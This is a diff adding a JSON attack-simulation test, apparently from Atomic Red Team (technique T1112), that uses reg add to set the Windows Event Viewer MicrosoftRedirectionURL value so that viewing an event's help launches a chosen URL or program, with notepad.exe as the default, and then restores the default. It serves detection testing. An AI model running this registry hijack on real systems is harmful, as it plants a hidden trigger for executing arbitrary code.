@@ -1,0 +1,52 @@
+{
+  "id": "6174be7f-5153-4afd-92c5-e0c3b7cdb5ae",
+  "name": "Event Viewer Registry Modification - Redirection URL",
+  "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ea9b7400-e5d8-43d3-a387-8bc0ca5707d3",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"#{redirection_url}\" /f",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f1baeaf1-5077-427e-b7cb-ed0a8b1f8fdf",
+      "type": "execute-command",
+      "data": {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"http://go.microsoft.com/fwlink/events.asp\" /f",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ea9b7400-e5d8-43d3-a387-8bc0ca5707d3",
+      "p": "on-success",
+      "o": "f1baeaf1-5077-427e-b7cb-ed0a8b1f8fdf"
+    },
+    {
+      "s": "ea9b7400-e5d8-43d3-a387-8bc0ca5707d3",
+      "p": "on-failure",
+      "o": "f1baeaf1-5077-427e-b7cb-ed0a8b1f8fdf"
+    }
+  ],
+  "tags": [
+    "T1112",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "redirection_url",
+      "type": "url",
+      "description": "URL to open or file URI to execute upon opening the event help",
+      "value": "file://C:\\windows\\system32\\notepad.exe"
+    }
+  ]
+}
